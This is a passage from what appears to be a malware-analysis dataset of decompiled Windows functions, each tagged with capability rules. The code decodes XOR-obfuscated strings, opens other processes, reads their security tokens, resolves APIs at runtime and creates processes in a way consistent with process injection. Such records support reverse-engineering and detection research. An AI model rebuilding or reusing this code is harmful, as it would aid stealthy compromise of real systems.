*(&var_40h + var_8h % 6));\n                }\n                var_ach = fcn.00404650(arg_8h);\n                if (var_ach != 0) {\n                    var_68h[0] = 0xf;\n                    var_68h[1] = 0x1f;\n                    var_68h[2] = 0x28;\n                    var_68h[3] = 0x24;\n                    var_64h = 0x18;\n                    var_63h = 0x38;\n                    var_62h = 0x1a;\n                    var_61h = 0xb;\n                    var_60h = 0x25;\n                    var_5fh = 8;\n                    var_5eh = 0x2b;\n                    var_5dh = 0xf;\n                    var_5ch = 0x5a;\n                    var_30h[0] = 0x59;\n                    var_30h[1] = 0x76;\n                    var_30h[2] = 0x5a;\n                    var_30h[3] = 0x50;\n                    var_2ch = 0x6d;\n                    fcn.004012a0(0xd);\n                    for (var_ch = 0; var_ch < 0xd; var_ch = var_ch + 1) {\n                        fcn.00401280(var_ch, var_68h[var_ch] ^ var_30h[var_ch % 5]);\n                    }\n                    (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 1, 0, 0, &TokenInformationLength);\n                    iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    if (iVar2 == 0x7a) {\n                        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, TokenInformationLength);\n                        TokenInformation = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                        if (TokenInformation != NULL) {\n                            iVar2 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)\n                                              (TokenHandle, 1, TokenInformation, TokenInformationLength, \n                                               &TokenInformationLength);\n                            if ((iVar2 != 0) &&\n                               (iVar2 = (*_sym.imp.ADVAPI32.dll_LookupAccountSidW)\n                                                  (0, *TokenInformation, var_1ch, &var_c8h, var_18h, &var_c4h, &var_cch)\n                               ,  iVar2 != 0)) {\n                                var_a8h._0_1_ = 10;\n                                var_a8h._1_1_ = 0x5a;\n                                var_a8h._2_1_ = 0x3c;\n                                var_a8h._3_1_ = 0x67;\n                                var_a4h = 99;\n                                var_a3h = 0x69;\n                                var_a2h = 10;\n                                var_a1h = 0x5a;\n                                var_a0h = 0x30;\n                                var_9fh = 0x67;\n                                var_9eh = 0x7f;\n                                var_9dh = 0x69;\n                                var_9ch = 0x17;\n                                var_9bh = 0x5a;\n                                var_9ah = 0x43;\n                                var_99h = 0x67;\n                                var_98h = 0x6c;\n                                var_97h = 0x69;\n                                var_96h = 5;\n                                var_95h = 0x5a;\n                                var_94h = 0x5c;\n                                var_93h = 0x67;\n                                var_92h = 0x43;\n                                var_91h = 0x69;\n                                var_90h = 5;\n                                var_8fh = 0x5a;\n                                var_8eh = 0x5c;\n                                var_8dh = 0x67;\n                                var_8ch = 0x43;\n                                var_8bh = 0x69;\n                                var_8ah = 5;\n                                var_89h = 0x5a;\n                                var_88h = 0x5c;\n                                var_87h = 0x67;\n                                var_86h = 0x54;\n                                var_85h = 0x69;\n                                var_84h = 0x59;\n                                var_83h = 0x5a;\n                                var_48h._0_1_ = 0x59;\n                                var_48h._1_1_ = 0x5a;\n                                var_48h._2_1_ = 0x79;\n                                var_48h._3_1_ = 0x67;\n                                var_44h = 0x30;\n                                var_43h = 0x69;\n                                fcn.004012a0(0x4c);\n                                for (var_10h = 0; var_10h < 0x26; var_10h = var_10h + 1) {\n                                    fcn.00401280(var_10h, *(&var_a8h + var_10h) ^ *(&var_48h + var_10h % 6));\n                                }\n                                uVar1 = fcn.00401270(var_18h, var_1ch, var_ach);\n                                (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, uVar1);\n                                var_c0h = 1;\n                                fcn.004012d0();\n                            }\n                            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, TokenInformation);\n                            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                        }\n                    }\n                    fcn.004012d0();\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n                fcn.004012d0();\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(ProcessHandle);\n            fcn.004012d0();\n        }\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_18h);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_1ch);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    }\n    return var_c0h;\n}\n",
        "token_count": 3403
    },
    "00404e50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuchar * __cdecl fcn.00404e50(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar *puVar4;\n    uint var_90h;\n    uint var_88h;\n    uint var_80h;\n    uint var_78h;\n    uint var_74h;\n    uchar *var_70h;\n    uchar *var_6ch;\n    code *var_68h;\n    uint var_64h;\n    uchar *ARG_0;\n    uint var_5ch;\n    uchar var_58h;\n    uchar var_57h;\n    uchar var_56h;\n    uchar var_55h;\n    uchar var_54h;\n    uchar var_53h;\n    uchar var_52h;\n    uchar var_51h;\n    uchar var_50h;\n    uchar var_4fh;\n    uchar var_4eh;\n    uchar var_4dh;\n    uint8_t var_4ch [4];\n    uchar var_48h;\n    uchar var_47h;\n    uchar var_46h;\n    uchar var_45h;\n    uchar var_44h;\n    uchar var_43h;\n    uchar var_42h;\n    uchar var_41h;\n    uchar var_40h;\n    uint var_3ch;\n    uchar var_38h;\n    uchar var_37h;\n    uchar var_36h;\n    uchar var_35h;\n    uchar var_34h;\n    uchar var_33h;\n    uchar var_32h;\n    uchar var_31h;\n    uchar var_30h;\n    uint var_2ch;\n    uchar var_28h;\n    uchar var_27h;\n    uint var_24h;\n    uchar var_20h;\n    uchar var_1fh;\n    uint var_1ch;\n    uchar var_18h;\n    uchar var_17h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puVar3 = &var_78h;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = &var_90h;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = &var_88h;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = &var_80h;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_5ch._0_1_ = 5;\n    var_5ch._1_1_ = 0x16;\n    var_5ch._2_1_ = 6;\n    var_5ch._3_1_ = 0x14;\n    var_58h = 0x3c;\n    var_57h = 0x37;\n    var_56h = 0x21;\n    var_55h = 0x16;\n    var_54h = 1;\n    var_53h = 0x37;\n    var_52h = 0x1a;\n    var_51h = 0x31;\n    var_50h = 0x2f;\n    var_4fh = 0x16;\n    var_4eh = 1;\n    var_4dh = 0x44;\n    var_1ch._0_1_ = 0x42;\n    var_1ch._1_1_ = 0x73;\n    var_1ch._2_1_ = 0x72;\n    var_1ch._3_1_ = 0x44;\n    var_18h = 0x4e;\n    var_17h = 0x58;\n    fcn.004012a0(0x10);\n    for (var_4h = 0; var_4h < 0x10; var_4h = var_4h + 1) {\n        fcn.00401280(var_4h, *(&var_5ch + var_4h) ^ *(&var_1ch + var_4h % 6));\n    }\n    var_3ch._0_1_ = 0xd;\n    var_3ch._1_1_ = 0x51;\n    var_3ch._2_1_ = 0x36;\n    var_3ch._3_1_ = 0x5a;\n    var_38h = 0x3f;\n    var_37h = 0;\n    var_36h = 0x55;\n    var_35h = 6;\n    var_34h = 0x6a;\n    var_33h = 0x50;\n    var_32h = 0x36;\n    var_31h = 0;\n    var_30h = 0x66;\n    var_24h._0_1_ = 0x66;\n    var_24h._1_1_ = 0x34;\n    var_24h._2_1_ = 0x44;\n    var_24h._3_1_ = 0x34;\n    var_20h = 0x5a;\n    var_1fh = 0x6c;\n    fcn.004012a0(0xd);\n    for (var_8h = 0; var_8h < 0xd; var_8h = var_8h + 1) {\n        fcn.00401280(var_8h, *(&var_3ch + var_8h) ^ *(&var_24h + var_8h % 6));\n    }\n    uVar1 = fcn.00401270();\n    uVar1 = fcn.00401270(uVar1);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(uVar1);\n    var_68h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    if ((var_68h == NULL) || (iVar2 = (*var_68h)(arg_8h, &var_78h, &var_90h, &var_88h, &var_80h),  iVar2 == 0)) {\n        var_70h = NULL;\n        fcn.004012d0();\n        fcn.004012d0();\n        var_6ch = var_70h;\n    }\n    else {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x104);\n        ARG_0 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        puVar4 = ARG_0;\n        for (iVar2 = 0x104; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        var_4ch[0] = 0x44;\n        var_4ch[1] = 0x26;\n        var_4ch[2] = 0x49;\n        var_4ch[3] = 0x55;\n        var_48h = 0x44;\n        var_47h = 0x4f;\n        var_46h = 0x19;\n        var_45h = 0x6f;\n        var_44h = 0x41;\n        var_43h = 0x40;\n        var_42h = 0x4c;\n        var_41h = 0xf;\n        var_40h = 0x61;\n        var_2ch._0_1_ = 0x61;\n        var_2ch._1_1_ = 0x42;\n        var_2ch._2_1_ = 100;\n        var_2ch._3_1_ = 0x70;\n        var_28h = 0x74;\n        var_27h = 0x77;\n        fcn.004012a0(0xd);\n        for (var_ch = 0; var_ch < 0xd; var_ch = var_ch + 1) {\n            fcn.00401280(var_ch, var_4ch[var_ch] ^ *(&var_2ch + var_ch % 6));\n        }\n        uVar1 = fcn.00401270(arg_ch, var_74h, var_78h);\n        (*_sym.imp.USER32.dll_wsprintfA)(ARG_0, uVar1);\n        var_6ch = ARG_0;\n        fcn.004012d0();\n        fcn.004012d0();\n        fcn.004012d0();\n    }\n    return var_6ch;\n}\n",
        "token_count": 2080
    },
    "00405160": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405160(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    int32_t var_4h;\n    \n    if (*0x4369d0 == NULL) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 4000);\n        *0x4369d0 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        puVar3 = *0x4369d0;\n        for (iVar2 = 4000; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar3 = 0;\n            puVar3 = puVar3 + 1;\n        }\n    }\n    if (*0x4369d0 != NULL) {\n        for (var_4h = 0; var_4h < 1000; var_4h = var_4h + 1) {\n            if (*(*0x4369d0 + var_4h * 4) == arg_8h) {\n                return 1;\n            }\n            if (*(*0x4369d0 + var_4h * 4) == 0) {\n                *(*0x4369d0 + var_4h * 4) = arg_8h;\n                return 0;\n            }\n        }\n    }\n    return 1;\n}\n",
        "token_count": 318
    },
    "00405210": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00405210(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t arg_8h_01;\n    uint uVar1;\n    uint var_10h;\n    int32_t var_ch;\n    uint hObject;\n    uint var_4h;\n    \n    var_ch = 0;\n    arg_8h_00 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, arg_8h);\n    if (arg_8h_00 != 0) {\n        arg_8h_01 = fcn.00404e50(arg_8h_00, arg_8h);\n        if (arg_8h_01 != 0) {\n            var_ch = fcn.00404180(arg_8h_01);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, arg_8h_01);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(arg_8h_00);\n    }\n    return var_ch == 0;\n}\n",
        "token_count": 256
    },
    "004052a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004052a0(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_48h;\n    uchar var_44h;\n    uchar var_43h;\n    uchar var_42h;\n    uchar var_41h;\n    uchar var_40h;\n    uchar var_3fh;\n    uchar var_3eh;\n    uchar var_3dh;\n    uchar var_3ch;\n    uchar var_3bh;\n    uchar var_3ah;\n    uint8_t var_38h [4];\n    uchar var_34h;\n    uchar var_33h;\n    uchar var_32h;\n    uchar var_31h;\n    uchar var_30h;\n    uchar var_2fh;\n    uchar var_2eh;\n    uchar var_2dh;\n    uchar var_2ch;\n    uint var_28h;\n    uchar var_24h;\n    uchar var_23h;\n    uint var_20h;\n    uchar var_1ch;\n    uchar var_1bh;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    var_48h._0_1_ = 0x2b;\n    var_48h._1_1_ = 0x2a;\n    var_48h._2_1_ = 0x3e;\n    var_48h._3_1_ = 0x20;\n    var_44h = 0x2f;\n    var_43h = 0x7d;\n    var_42h = 0x56;\n    var_41h = 9;\n    var_40h = 0x1b;\n    var_3fh = 0x20;\n    var_3eh = 0x3b;\n    var_3dh = 0x2e;\n    var_3ch = 0x11;\n    var_3bh = 0x2a;\n    var_3ah = 0x69;\n    var_20h._0_1_ = 0x62;\n    var_20h._1_1_ = 0x59;\n    var_20h._2_1_ = 0x69;\n    var_20h._3_1_ = 0x4f;\n    var_1ch = 0x58;\n    var_1bh = 0x4b;\n    fcn.004012a0(0xf);\n    for (var_4h = 0; var_4h < 0xf; var_4h = var_4h + 1) {\n        fcn.00401280(var_4h, *(&var_48h + var_4h) ^ *(&var_20h + var_4h % 6));\n    }\n    var_38h[0] = 0xd;\n    var_38h[1] = 0x51;\n    var_38h[2] = 0x36;\n    var_38h[3] = 0x5a;\n    var_34h = 0x3f;\n    var_33h = 0;\n    var_32h = 0x55;\n    var_31h = 6;\n    var_30h = 0x6a;\n    var_2fh = 0x50;\n    var_2eh = 0x36;\n    var_2dh = 0;\n    var_2ch = 0x66;\n    var_28h._0_1_ = 0x66;\n    var_28h._1_1_ = 0x34;\n    var_28h._2_1_ = 0x44;\n    var_28h._3_1_ = 0x34;\n    var_24h = 0x5a;\n    var_23h = 0x6c;\n    fcn.004012a0(0xd);\n    for (var_8h = 0; var_8h < 0xd; var_8h = var_8h + 1) {\n        fcn.00401280(var_8h, var_38h[var_8h] ^ *(&var_28h + var_8h % 6));\n    }\n    uVar1 = fcn.00401270();\n    uVar1 = fcn.00401270(uVar1);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(uVar1);\n    *0x4383a8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    if ((*0x4383a8 != NULL) && (iVar2 = (**0x4383a8)(arg_8h, &var_ch),  iVar2 == 0)) {\n        var_ch = 0;\n    }\n    var_18h = var_ch;\n    fcn.004012d0();\n    fcn.004012d0();\n    return var_18h;\n}\n",
        "token_count": 1144
    },
    "00405460": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405460(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint *puVar4;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t *var_4h;\n    \n    var_8h = 0;\n    var_18h = -1;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n    var_4h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    piVar3 = var_4h;\n    for (iVar2 = 0x10; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *piVar3 = 0;\n        piVar3 = piVar3 + 1;\n    }\n    var_4h[2] = arg_8h;\n    var_10h = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x43a, 0, arg_8h);\n    *var_4h = var_10h;\n    if (var_10h != 0) {\n        puVar4 = &var_30h;\n        for (iVar2 = 0x18; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        var_20h = 0x5e00;\n        var_30h = 0x4282f8;\n        var_2ch = 0;\n        var_1ch = 0x8000;\n        var_28h = 0x42e0f8;\n        var_24h = 0;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n        iVar2 = fcn.004052a0(uVar1);\n        if (iVar2 != 0) {\n            iVar2 = fcn.004052a0(*var_4h);\n            if (iVar2 == 0) {\n                var_14h = 0;\n            }\n            else {\n                var_14h = 0x10;\n            }\n            var_8h = var_8h | var_14h;\n        }\n        for (var_ch = 0; var_ch < 0x14; var_ch = var_ch + 1) {\n            var_18h = fcn.004038c0(var_4h, &var_30h, var_8h, 0, fcn.00403c10, 0);\n            (*_sym.imp.KERNEL32.dll_Sleep)(100);\n            fcn.004038c0(var_4h, &var_30h, var_8h, 0, fcn.00403c10, 0);\n            if (var_18h == 0) break;\n            (*_sym.imp.KERNEL32.dll_Sleep)(0x32);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*var_4h);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(var_4h[1]);\n    }\n    return 0;\n}\n",
        "token_count": 780
    },
    "004055d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004055d0(int32_t arg_8h, uchar *lpImageFileName)\n\n{\n    int32_t iVar1;\n    uint hProcess;\n    \n    *lpImageFileName = 0;\n    if (arg_8h != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x100410, 0, arg_8h);\n        if (iVar1 != 0) {\n            (*_sym.imp.PSAPI.DLL_GetProcessImageFileNameA)(iVar1, lpImageFileName, 0x104);\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 149
    },
    "00405630": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405630(int32_t arg_8h, ushort *arg_ch)\n\n{\n    uint uVar1;\n    uint var_8h;\n    int32_t hObject;\n    \n    if (*0x437fa4 == NULL) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0x425438, \"QueryFullProcessImageNameW\");\n        *0x437fa4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    }\n    if ((*0x437fa4 != NULL) && (*arg_ch = 0,  arg_8h != 0)) {\n        hObject = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x100410, 0, arg_8h);\n        var_8h = 0x104;\n        if (hObject != 0) {\n            (**0x437fa4)(hObject, 0, arg_ch, &var_8h);\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n        }\n    }\n    return;\n}\n",
        "token_count": 235
    },
    "004084e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004084e0(uint *arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar *puVar4;\n    uint var_74h;\n    uint var_30h;\n    uchar var_2ch;\n    uchar var_2bh;\n    uchar var_2ah;\n    uchar var_29h;\n    uchar var_28h;\n    uchar var_27h;\n    uchar var_26h;\n    uchar var_25h;\n    uchar var_24h;\n    uchar var_23h;\n    uchar var_22h;\n    uchar var_21h;\n    uchar var_20h;\n    uchar var_1fh;\n    uint8_t var_1ch [4];\n    uchar var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uchar *psz1;\n    int32_t var_4h;\n    \n    var_14h = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    psz1 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    puVar3 = arg_8h;\n    for (iVar2 = 0x10; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = &var_74h;\n    for (iVar2 = 0x44; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar4 = psz1;\n    for (iVar2 = 0x208; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    var_74h = 0x44;\n    var_30h._0_1_ = 0x52;\n    var_30h._1_1_ = 0x36;\n    var_30h._2_1_ = 0x7d;\n    var_30h._3_1_ = 0x4f;\n    var_2ch = 0x62;\n    var_2bh = 0x72;\n    var_2ah = 0x40;\n    var_29h = 0x50;\n    var_28h = 0x38;\n    var_27h = 0x4f;\n    var_26h = 10;\n    var_25h = 0x36;\n    var_24h = 0x29;\n    var_23h = 0x4f;\n    var_22h = 0x35;\n    var_21h = 0x72;\n    var_20h = 0x36;\n    var_1fh = 0x50;\n    var_1ch[0] = 0x72;\n    var_1ch[1] = 0x36;\n    var_1ch[2] = 0x50;\n    var_1ch[3] = 0x4f;\n    var_18h = 0x4f;\n    fcn.004012a0(0x24);\n    for (var_4h = 0; var_4h < 0x12; var_4h = var_4h + 1) {\n        fcn.00401280(var_4h, *(&var_30h + var_4h) ^ var_1ch[var_4h % 5]);\n    }\n    (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, *0x436b44);\n    uVar1 = fcn.00401270();\n    (*_sym.imp.SHLWAPI.dll_StrCatW)(psz1, uVar1);\n    (*_sym.imp.KERNEL32.dll_CreateProcessW)(0, psz1, 0, 0, 0, 0x9000008, 0, 0, &var_74h, arg_8h);\n    if (arg_8h[1] != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(arg_8h[1]);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, psz1);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    var_10h = *arg_8h;\n    fcn.004012d0();\n    return var_10h;\n}\n",
        "token_count": 1053
    },
    "00408670": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00408670(uint dwProcessId, int32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint *puVar4;\n    uint psz1;\n    uint var_1f8h;\n    uint var_1f0h;\n    uint var_1cch;\n    uint var_1c8h;\n    uint var_1b4h;\n    uint var_1b0h;\n    int32_t var_1ach;\n    uint var_1a8h;\n    uint var_1a4h;\n    uint var_1a0h;\n    uint var_19ch;\n    uint TokenInformation;\n    uint hObject;\n    uint var_190h;\n    uint var_18ch;\n    uint var_188h;\n    uint var_184h;\n    uint var_180h;\n    uint var_17ch;\n    uint32_t var_178h;\n    uint var_174h;\n    uint hExistingToken;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uchar var_160h;\n    uchar var_15fh;\n    uchar var_15eh;\n    uchar var_15dh;\n    uchar var_15ch;\n    uchar var_15bh;\n    uchar var_15ah;\n    uchar var_159h;\n    uchar var_158h;\n    uchar var_157h;\n    uchar var_156h;\n    uchar var_155h;\n    uchar var_154h;\n    uchar var_153h;\n    uchar var_152h;\n    uchar var_151h;\n    uchar var_150h;\n    uchar var_14fh;\n    uchar var_14eh;\n    uchar var_14dh;\n    uchar var_14ch;\n    uchar var_14bh;\n    uchar var_14ah;\n    uchar var_149h;\n    uchar var_148h;\n    uchar var_147h;\n    uchar var_146h;\n    uchar var_145h;\n    uint var_144h;\n    uchar var_140h;\n    uchar var_13fh;\n    uchar var_13eh;\n    uchar var_13dh;\n    uchar var_13ch;\n    uchar var_13bh;\n    uchar var_13ah;\n    uchar var_139h;\n    uchar var_138h;\n    uchar var_137h;\n    uchar var_136h;\n    uchar var_135h;\n    uchar var_134h;\n    uchar var_133h;\n    uchar var_132h;\n    uchar var_131h;\n    uchar var_130h;\n    uchar var_12fh;\n    uchar var_12eh;\n    uchar var_12dh;\n    uchar var_12ch;\n    uint var_128h;\n    uchar var_124h;\n    uchar var_123h;\n    uchar var_122h;\n    uchar var_121h;\n    uchar var_120h;\n    uchar var_11fh;\n    uchar var_11eh;\n    uchar var_11dh;\n    uchar var_11ch;\n    uchar var_11bh;\n    uchar var_11ah;\n    uchar var_119h;\n    uchar var_118h;\n    uchar var_117h;\n    uchar var_116h;\n    uchar var_115h;\n    uchar var_114h;\n    uchar var_113h;\n    uchar var_112h;\n    uchar var_111h;\n    uint var_110h;\n    uchar var_10ch;\n    uchar var_10bh;\n    uchar var_10ah;\n    uchar var_109h;\n    uchar var_108h;\n    uchar var_107h;\n    uchar var_106h;\n    uchar var_105h;\n    uchar var_104h;\n    uchar var_103h;\n    uchar var_102h;\n    uchar var_101h;\n    uchar var_100h;\n    uchar var_ffh;\n    uchar var_feh;\n    uchar var_fdh;\n    uchar var_fch;\n    uchar var_fbh;\n    uint8_t var_f8h [4];\n    uchar var_f4h;\n    uchar var_f3h;\n    uchar var_f2h;\n    uchar var_f1h;\n    uchar var_f0h;\n    uchar var_efh;\n    uchar var_eeh;\n    uchar var_edh;\n    uchar var_ech;\n    uchar var_ebh;\n    uchar var_eah;\n    uchar var_e9h;\n    uchar var_e8h;\n    uchar var_e7h;\n    uint var_e4h;\n    uchar var_e0h;\n    uchar var_dfh;\n    uchar var_deh;\n    uchar var_ddh;\n    uchar var_dch;\n    uchar var_dbh;\n    uchar var_dah;\n    uchar var_d9h;\n    uchar var_d8h;\n    uchar var_d7h;\n    uchar var_d6h;\n    uchar var_d5h;\n    uchar var_d4h;\n    uchar var_d3h;\n    uint8_t var_d0h [4];\n    uchar var_cch;\n    uchar var_cbh;\n    uchar var_cah;\n    uchar var_c9h;\n    uchar var_c8h;\n    uchar var_c7h;\n    uchar var_c6h;\n    uchar var_c5h;\n    uchar var_c4h;\n    uchar var_c3h;\n    uchar var_c2h;\n    uchar var_c1h;\n    uchar var_c0h;\n    uchar var_bfh;\n    uint var_bch;\n    uchar var_b8h;\n    uchar var_b7h;\n    uchar var_b6h;\n    uchar var_b5h;\n    uchar var_b4h;\n    uchar var_b3h;\n    uchar var_b2h;\n    uchar var_b1h;\n    uchar var_b0h;\n    uint var_ach;\n    uchar var_a8h;\n    uchar var_a7h;\n    uchar var_a6h;\n    uchar var_a5h;\n    uchar var_a4h;\n    uchar var_a3h;\n    uchar var_a2h;\n    uchar var_a1h;\n    uchar var_a0h;\n    uint var_9ch;\n    uchar var_98h;\n    uchar var_97h;\n    uchar var_96h;\n    uchar var_95h;\n    uchar var_94h;\n    uchar var_93h;\n    uint var_90h;\n    uchar var_8ch;\n    uchar var_8bh;\n    uint8_t var_88h [4];\n    uchar var_84h;\n    uchar var_83h;\n    uint pIdentifierAuthority;\n    uchar var_7ch;\n    uchar var_7bh;\n    uint8_t var_78h [4];\n    uchar var_74h;\n    uchar var_73h;\n    uint8_t var_70h [4];\n    uchar var_6ch;\n    uchar var_6bh;\n    uint var_68h;\n    uchar var_64h;\n    uint var_60h;\n    uchar var_5ch;\n    uint var_58h;\n    uchar var_54h;\n    uint var_50h;\n    uchar 